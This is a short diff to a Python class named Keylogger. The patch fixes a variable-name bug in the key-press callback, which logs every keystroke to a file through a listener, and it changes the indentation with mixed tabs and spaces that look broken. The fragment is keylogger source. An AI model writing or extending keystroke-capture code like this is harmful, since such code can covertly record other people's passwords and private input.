@@ -95,8 +95,9 @@ class Keylogger():
         else:
             file_creator.create_file("logs",keylogger.script_name,"Script may have encountered erros")
 
-        def on_press(key):
-            logging.info(str(Key))
+	def on_press(key):
+    		logging.info(str(key))
+
         
         with Listener(on_press=on_press) as listener:
             listener.join()
